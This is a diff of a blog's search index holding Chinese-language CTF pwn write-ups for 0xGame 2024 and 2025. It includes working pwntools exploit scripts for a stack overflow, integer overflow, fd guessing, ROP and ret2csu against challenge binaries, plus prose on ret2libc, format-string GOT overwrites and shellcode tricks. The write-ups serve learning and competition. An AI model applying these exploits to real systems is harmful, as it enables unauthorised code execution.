@@ -1,6 +1,54 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>0xGame2024-Week1-Pwn</title>
+    <url>/2025/12/21/0xGame2024-Week1/</url>
+    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame-Week1-Pwn"></a>0xGame-Week1-Pwn</h1><h2 id="1-Stackoverflow"><a href="#1-Stackoverflow" class="headerlink" title="1.Stackoverflow"></a>1.Stackoverflow</h2><p>就是一道简单的栈溢出。要考虑栈对齐的问题，不过直接控制执行流到0x4012DD就可以直接getshell，不用考虑栈平衡了。</p>
+<p><img src="/images/24week1.1-1.png" alt="ida"></p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012dd</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x28</span> + p64(backdoor)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her:&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Positive"><a href="#2-Positive" class="headerlink" title="2.Positive"></a>2.Positive</h2><p><img src="/images/24week1.2-1.png" alt="ida"></p>
+<p>可以看出来，这里有一个无符号数转化，也就是存在整数溢出。所以我们只要输入bytes为-1，就可以得到一个较大的输入长度。然后就可以按照ret2text去做了。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor =  <span class="number">0x401272</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walk:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walking:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-Find-me"><a href="#3-Find-me" class="headerlink" title="3.Find_me"></a>3.Find_me</h2><p><img src="/images/24week1.3-1.png" alt="main"></p>
+<p>这是一道关于fd的题目。</p>
+<p>fd，文件描述符。每打开一个文件便会加1。stdin（标准输入）– 0；stdout（标准输出）–1；stderr（标准错误输出）–2；后面我们打开的文件的fd就依次+1。既从3开始。</p>
+<p>ida里可以看出，这里是为随机。所以我们可以调用ctypes库 ，来撞i_1的值。那么fd的值就应该是i_1+3。由于 这里把标准输出关了，所以可以采用stderr来输出flag。</p>
+<p><img src="/images/24week1.3-2.png" alt="do_bad"></p>
+<p>可以看到，这里的fd是我们自己写入的（伪随机可以得到flag的fd）。那么我们就可以通过先向what地址读入flag，再写出what地址里存放的内容，也就是flag。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">fd = libc.rand() % <span class="number">100</span> + <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;fd=&#x27;</span>,fd)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;dolls ?&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(fd))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-Where-is-my-binsh"><a href="#4-Where-is-my-binsh" class="headerlink" title="4.Where_is_my_binsh"></a>4.Where_is_my_binsh</h2><p>一个正常的ret2rop的打法。开头输入&#x2F;bin&#x2F;sh在bss段。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;create it:&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">io.send(pl1)</span><br><span class="line">bss = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x401323</span></span><br><span class="line">sys = <span class="number">0x401090</span></span><br><span class="line">ret = <span class="number">0x4012b5</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now ?&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-Ret2csu"><a href="#5-Ret2csu" class="headerlink" title="5.Ret2csu"></a>5.Ret2csu</h2><p><img src="/images/24week1.5-1.png" alt="main"></p>
+<p>可以看出来，和上一题有相似之处，也可以输入&#x2F;bin&#x2F;sh到bss段。注意的是，这里有strlen绕过。也就是说我们可以把\x00当作padding来绕过。然后这里ret2csu的技巧就不多说了，可以看blog里有一篇关于ret2csu的基本用法，关键是对各个寄存器的值的控制。</p>
+<p>下面给出exp。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her~\n&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x4010e0</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;do?\n&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404098</span></span><br><span class="line">binsh = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x4013c3</span></span><br><span class="line">gadget1 = <span class="number">0x4013BA</span></span><br><span class="line">gadget2 = <span class="number">0x4013a0</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = binsh</span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">r15 = bss</span><br><span class="line">pl2 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(gadget2)</span><br><span class="line"><span class="comment">#binsh_addr pop ---&gt; rdi; call r15 ---&gt; call bss ---&gt; call execve</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于打的是本地，还有两道题需要用dockerfile，就先鸽着了QAQ。</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>0xGame2024-Week2-Pwn</title>
     <url>/2025/12/21/0xGame2024-Week2/</url>
     <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame-Week2-Pwn"></a>0xGame-Week2-Pwn</h1><h2 id="1-Boom"><a href="#1-Boom" class="headerlink" title="1.Boom"></a>1.Boom</h2><p>根据题目就可以简单推测是一道爆破题。</p>
@@ -75,45 +123,73 @@
       </tags>
   </entry>
   <entry>
-    <title>0xGame2024-Week1-Pwn</title>
-    <url>/2025/12/21/0xGame2024-Week1/</url>
-    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame-Week1-Pwn"></a>0xGame-Week1-Pwn</h1><h2 id="1-Stackoverflow"><a href="#1-Stackoverflow" class="headerlink" title="1.Stackoverflow"></a>1.Stackoverflow</h2><p>就是一道简单的栈溢出。要考虑栈对齐的问题，不过直接控制执行流到0x4012DD就可以直接getshell，不用考虑栈平衡了。</p>
-<p><img src="/images/24week1.1-1.png" alt="ida"></p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012dd</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x28</span> + p64(backdoor)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her:&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-Positive"><a href="#2-Positive" class="headerlink" title="2.Positive"></a>2.Positive</h2><p><img src="/images/24week1.2-1.png" alt="ida"></p>
-<p>可以看出来，这里有一个无符号数转化，也就是存在整数溢出。所以我们只要输入bytes为-1，就可以得到一个较大的输入长度。然后就可以按照ret2text去做了。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor =  <span class="number">0x401272</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walk:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walking:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-Find-me"><a href="#3-Find-me" class="headerlink" title="3.Find_me"></a>3.Find_me</h2><p><img src="/images/24week1.3-1.png" alt="main"></p>
-<p>这是一道关于fd的题目。</p>
-<p>fd，文件描述符。每打开一个文件便会加1。stdin（标准输入）– 0；stdout（标准输出）–1；stderr（标准错误输出）–2；后面我们打开的文件的fd就依次+1。既从3开始。</p>
-<p>ida里可以看出，这里是为随机。所以我们可以调用ctypes库 ，来撞i_1的值。那么fd的值就应该是i_1+3。由于 这里把标准输出关了，所以可以采用stderr来输出flag。</p>
-<p><img src="/images/24week1.3-2.png" alt="do_bad"></p>
-<p>可以看到，这里的fd是我们自己写入的（伪随机可以得到flag的fd）。那么我们就可以通过先向what地址读入flag，再写出what地址里存放的内容，也就是flag。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">fd = libc.rand() % <span class="number">100</span> + <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;fd=&#x27;</span>,fd)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;dolls ?&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(fd))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4-Where-is-my-binsh"><a href="#4-Where-is-my-binsh" class="headerlink" title="4.Where_is_my_binsh"></a>4.Where_is_my_binsh</h2><p>一个正常的ret2rop的打法。开头输入&#x2F;bin&#x2F;sh在bss段。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;create it:&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">io.send(pl1)</span><br><span class="line">bss = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x401323</span></span><br><span class="line">sys = <span class="number">0x401090</span></span><br><span class="line">ret = <span class="number">0x4012b5</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now ?&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="5-Ret2csu"><a href="#5-Ret2csu" class="headerlink" title="5.Ret2csu"></a>5.Ret2csu</h2><p><img src="/images/24week1.5-1.png" alt="main"></p>
-<p>可以看出来，和上一题有相似之处，也可以输入&#x2F;bin&#x2F;sh到bss段。注意的是，这里有strlen绕过。也就是说我们可以把\x00当作padding来绕过。然后这里ret2csu的技巧就不多说了，可以看blog里有一篇关于ret2csu的基本用法，关键是对各个寄存器的值的控制。</p>
-<p>下面给出exp。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her~\n&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x4010e0</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;do?\n&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404098</span></span><br><span class="line">binsh = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x4013c3</span></span><br><span class="line">gadget1 = <span class="number">0x4013BA</span></span><br><span class="line">gadget2 = <span class="number">0x4013a0</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = binsh</span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">r15 = bss</span><br><span class="line">pl2 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(gadget2)</span><br><span class="line"><span class="comment">#binsh_addr pop ---&gt; rdi; call r15 ---&gt; call bss ---&gt; call execve</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>由于打的是本地，还有两道题需要用dockerfile，就先鸽着了QAQ。</p>
+    <title>2025 0xGame Week1 Pwn</title>
+    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
+    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
+<p><img src="/images/week1-1(1).png" alt="图解"></p>
+<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
+<p><img src="/images/week1-2(1).png" alt="图解"></p>
+<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
+<p><img src="/images/week1-3(1).png" alt="ida"></p>
+<p><img src="/images/week1-3(2).png" alt="exp"></p>
+<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
+<p><img src="/images/week1-3(3).png" alt="图解"></p>
+<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
+<p><img src="/images/week1-4(1).png" alt="ida"></p>
+<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
+<p><img src="/images/week1-4(4).png" alt="rdi"></p>
+<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
+<p><img src="/images/week1-4(2).png" alt="sh"></p>
+<p>从而可以构造exp</p>
+<p><img src="/images/week1-4(3).png" alt="exp"></p>
+<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
+<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
+<p><img src="/images/week1-5(1).png" alt="$0"></p>
+<p>exp如下图</p>
+<p><img src="/images/week1-5(2).png" alt="exp"></p>
+<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
+]]></content>
+      <categories>
+        <category>stack</category>
+      </categories>
+      <tags>
+        <tag>pwn入门</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2025 0xGame Week2 Pwn</title>
+    <url>/2025/11/12/2025-0xGame-Week2-Pwn/</url>
+    <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame Week2 Pwn"></a>0xGame Week2 Pwn</h1><h2 id="1-Ret2libc"><a href="#1-Ret2libc" class="headerlink" title="1.Ret2libc"></a>1.Ret2libc</h2><p>像这样类似的题，关键是确定libc.so.6的版本，然后泄露出libc_base的地址。因为这样可以确定system的地址和&#x2F;bin&#x2F;sh的地址，从而实现getshell。</p>
+<p><img src="/images/week2-1(1).png" alt="ida"></p>
+<p>由vuln可以看出read存在溢出点。</p>
+<p><img src="/images/week2-1(2).png" alt="exp"></p>
+<p>解读一下exp，这边pl1通过栈溢出，覆盖至ret，因为ret指令实际上相当于pop rip，即将rsp处的值弹给rip去执行。所以这里将ret地址返回为puts_plt，也就是会执行一个puts函数，同时rdi中存储着puts的真实地址，由puts_got表跳转得到。再减去由libc.so.6版本控制的offset，就可以获得libc_base的地址。然后就是正常的rop链攻击。</p>
+<h2 id="2-格式化字符串"><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2><p>将附件丢进ida静态分析</p>
+<p><img src="/images/week2-2(1).png" alt="ida"></p>
+<p>可以看出这里有两次read和printf函数，并且每次都会将我们输入的数据输出。由于第一个read函数规定读取数据大小只有0x60，所以这里不存在溢出点。但是可以通过第一个read来泄露一些我们需要的数据，如canary和libc_base的地址。·第二个read存在栈溢出，是我们构造payload的重点。</p>
+<p><img src="/images/week2-2(2).png" alt="exp"></p>
+<p>这里来解释一下exp，通过数据测试，可以得到我们填入的数据应该在栈上第六个位置。从上往下找，看到末尾字节为00的就是canary的地址。（特性）</p>
+<p><img src="/images/week2-2(3).png" alt="gdb"></p>
+<p><img src="/images/week2-2(4).png" alt="gdb"></p>
+<p>在栈上距离我们输入的aaaa（测试数据）为0x0d-0x00+6(寄存器)&#x3D;19，同时此时rcx处放的是read+18的地址。所以libc_base &#x3D; rcx内存的地址 - libc.symbols[‘read’] - 18。可以检验libc_base的末三位是否为000。如果是的，那么恭喜得到了正确的libc_base。然后就是进行对printf_got的改写，改写为system_addr。</p>
+<p>板子为：fmtstr_payload(6,{printf_got:system_addr})。一定要context.arch&#x3D;”amd64&#x2F;i386”。不过本题似乎仅仅使用板子不行。因为此处板子长度为0x78，会将canary的地址覆盖，导致段错误。（刻意去用板子其实也可以成功，但还是推荐手写）</p>
+<p>那怎么改写呢？由于libc_base+sysmbols[‘ ‘]，所以导致了system与printf其实仅仅有后三位字节不同也就是说只要改写后三位字节即可。</p>
+<p><img src="/images/week2-2(5).png"></p>
+<p>由于单次写入长度过大，可能导致不稳定，所以选择单字节或双字节写入。之后的就可以看exp。</p>
+<p>最后pl2为什么要填充到0x30呢？因为我改写的地址是12，13，对应栈上的位置应该是06，07，而此时距离rsp的距离就是0x30（不断向栈上填入数据，会将rsp”抬高”）。</p>
+<p><img src="/images/week2-2(6).png" alt="gdb"></p>
+<h2 id="3-植物大战僵尸"><a href="#3-植物大战僵尸" class="headerlink" title="3.植物大战僵尸"></a>3.植物大战僵尸</h2><p>进ida分析，可以看出是多线程问题，而且未上锁，且存在1s的延迟。</p>
+<p><img src="/images/week2-3(1).png" alt="ida"></p>
+<p><img src="/images/week2-3(2).png" alt="ida"></p>
+<p><img src="/images/week2-3(3).png" alt="ida"></p>
+<p>可以看出，这里的root函数存在后门。来一下实现条件，是trophy!&#x3D;0就可以了。所以可以通过在短时间内大量创建用户，将数组填满，就可以改变trophy的值为非0。下面是exp。</p>
+<p><img src="/images/week2-3(4).png" alt="exp"></p>
+<h2 id="4-任意代码执行"><a href="#4-任意代码执行" class="headerlink" title="4.任意代码执行"></a>4.任意代码执行</h2><p><img src="/images/week2-4(1).png" alt="ida"></p>
+<p>这里是通过构造shellcode读取到bss段进行恶意代码执行。可以看出这里如果我们输入的字节数大于3就会直接退出程序。所以我们需要绕过strlen检测。那么strlen是如何截断的呢？是通过读取’\x00’的前的字节数来返回字节数值。于是我们可以通过构造’\x00’+shellcode来绕过。这道题还有个小坑。如果用板子asm(shellcraft.sh())去进行shellcode构造的话，这道题是做不出来的。因为这里的read读取长度限制为0xa，也就是只有10个字节，是远远小于我们用板子直接构造出来的shellcode的。所以我们需要先构造一个可以读取足够长度的read函数，再来调用，从而读入我们需要的shellcode。</p>
+<p><img src="/images/week2-4(2).png" alt="exp"></p>
+<p>这边来说一下手动构造。</p>
+<p><img src="/images/week2-4(3).png" alt="gdb"></p>
+<p>想要构造read函数，就要先控制read传参的寄存器。即rdi–fd，rsi–buf，rdx–len。在gdb调试中，可以看出，rdi&#x3D;0，而我们仍然进行了xor rdi,rdi（保险起见），就是为了让rdi&#x3D;0。rsi此时指向的地址就是bss段，所以不需要进行修改。而我们需要一个较长的读取长度。可以看到这里的r11存放着0x246就已经够了，所以用mov rdx,r11就可以将把r11中的值给rdx，至此一个读取较长长度的read函数就构造好了。最后又用到了一个nop sled的技巧，通过填充大量的nop来使执行自己的恶意代码的概率提高。</p>
 ]]></content>
       <categories>
         <category>stack</category>
@@ -194,99 +270,47 @@
       </tags>
   </entry>
   <entry>
-    <title>2025 0xGame Week2 Pwn</title>
-    <url>/2025/11/12/2025-0xGame-Week2-Pwn/</url>
-    <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame Week2 Pwn"></a>0xGame Week2 Pwn</h1><h2 id="1-Ret2libc"><a href="#1-Ret2libc" class="headerlink" title="1.Ret2libc"></a>1.Ret2libc</h2><p>像这样类似的题，关键是确定libc.so.6的版本，然后泄露出libc_base的地址。因为这样可以确定system的地址和&#x2F;bin&#x2F;sh的地址，从而实现getshell。</p>
-<p><img src="/images/week2-1(1).png" alt="ida"></p>
-<p>由vuln可以看出read存在溢出点。</p>
-<p><img src="/images/week2-1(2).png" alt="exp"></p>
-<p>解读一下exp，这边pl1通过栈溢出，覆盖至ret，因为ret指令实际上相当于pop rip，即将rsp处的值弹给rip去执行。所以这里将ret地址返回为puts_plt，也就是会执行一个puts函数，同时rdi中存储着puts的真实地址，由puts_got表跳转得到。再减去由libc.so.6版本控制的offset，就可以获得libc_base的地址。然后就是正常的rop链攻击。</p>
-<h2 id="2-格式化字符串"><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2><p>将附件丢进ida静态分析</p>
-<p><img src="/images/week2-2(1).png" alt="ida"></p>
-<p>可以看出这里有两次read和printf函数，并且每次都会将我们输入的数据输出。由于第一个read函数规定读取数据大小只有0x60，所以这里不存在溢出点。但是可以通过第一个read来泄露一些我们需要的数据，如canary和libc_base的地址。·第二个read存在栈溢出，是我们构造payload的重点。</p>
-<p><img src="/images/week2-2(2).png" alt="exp"></p>
-<p>这里来解释一下exp，通过数据测试，可以得到我们填入的数据应该在栈上第六个位置。从上往下找，看到末尾字节为00的就是canary的地址。（特性）</p>
-<p><img src="/images/week2-2(3).png" alt="gdb"></p>
-<p><img src="/images/week2-2(4).png" alt="gdb"></p>
-<p>在栈上距离我们输入的aaaa（测试数据）为0x0d-0x00+6(寄存器)&#x3D;19，同时此时rcx处放的是read+18的地址。所以libc_base &#x3D; rcx内存的地址 - libc.symbols[‘read’] - 18。可以检验libc_base的末三位是否为000。如果是的，那么恭喜得到了正确的libc_base。然后就是进行对printf_got的改写，改写为system_addr。</p>
-<p>板子为：fmtstr_payload(6,{printf_got:system_addr})。一定要context.arch&#x3D;”amd64&#x2F;i386”。不过本题似乎仅仅使用板子不行。因为此处板子长度为0x78，会将canary的地址覆盖，导致段错误。（刻意去用板子其实也可以成功，但还是推荐手写）</p>
-<p>那怎么改写呢？由于libc_base+sysmbols[‘ ‘]，所以导致了system与printf其实仅仅有后三位字节不同也就是说只要改写后三位字节即可。</p>
-<p><img src="/images/week2-2(5).png"></p>
-<p>由于单次写入长度过大，可能导致不稳定，所以选择单字节或双字节写入。之后的就可以看exp。</p>
-<p>最后pl2为什么要填充到0x30呢？因为我改写的地址是12，13，对应栈上的位置应该是06，07，而此时距离rsp的距离就是0x30（不断向栈上填入数据，会将rsp”抬高”）。</p>
-<p><img src="/images/week2-2(6).png" alt="gdb"></p>
-<h2 id="3-植物大战僵尸"><a href="#3-植物大战僵尸" class="headerlink" title="3.植物大战僵尸"></a>3.植物大战僵尸</h2><p>进ida分析，可以看出是多线程问题，而且未上锁，且存在1s的延迟。</p>
-<p><img src="/images/week2-3(1).png" alt="ida"></p>
-<p><img src="/images/week2-3(2).png" alt="ida"></p>
-<p><img src="/images/week2-3(3).png" alt="ida"></p>
-<p>可以看出，这里的root函数存在后门。来一下实现条件，是trophy!&#x3D;0就可以了。所以可以通过在短时间内大量创建用户，将数组填满，就可以改变trophy的值为非0。下面是exp。</p>
-<p><img src="/images/week2-3(4).png" alt="exp"></p>
-<h2 id="4-任意代码执行"><a href="#4-任意代码执行" class="headerlink" title="4.任意代码执行"></a>4.任意代码执行</h2><p><img src="/images/week2-4(1).png" alt="ida"></p>
